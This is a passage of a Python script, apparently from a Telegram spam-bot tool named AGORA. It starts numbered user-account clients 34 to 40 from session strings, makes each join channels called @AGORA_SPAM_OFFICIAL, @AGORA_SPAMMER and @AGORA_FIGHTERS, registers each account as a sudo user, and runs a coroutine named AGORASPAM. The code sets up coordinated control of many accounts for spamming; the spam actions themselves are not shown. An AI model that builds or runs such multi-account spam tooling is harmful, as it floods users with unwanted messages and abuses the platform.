        AGORA34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        AGORA35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await AGORA35.start()
            await AGORA35(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA35(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA35(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botme = await AGORA35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = ""
        AGORA35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        AGORA36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await AGORA36.start()
            botme = await AGORA36.get_me()
            await AGORA36(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA36(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA36(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = ""
        AGORA36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        AGORA37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await AGORA37.start()
            botme = await AGORA37.get_me()
            await AGORA37(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA37(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA37(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = ""
        AGORA37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        AGORA38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await AGORA38.start()
            botme = await AGORA38.get_me()
            await AGORA38(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA38(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA38(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = ""
        AGORA38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        AGORA39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await AGORA39.start()
            botme = await AGORA39.get_me()
            await AGORA39(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA39(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA39(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = ""
        AGORA39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        AGORA40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await AGORA40.start()
            botme = await AGORA40.get_me()
            await AGORA40(functions.channels.JoinChannelRequest(channel="@AGORA_SPAM_OFFICIAL"))
            await AGORA40(functions.channels.JoinChannelRequest(channel="@AGORA_SPAMMER"))
            await AGORA40(functions.channels.JoinChannelRequest(channel="@AGORA_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = ""
        AGORA40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await AGORA40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(AGORASPAM())
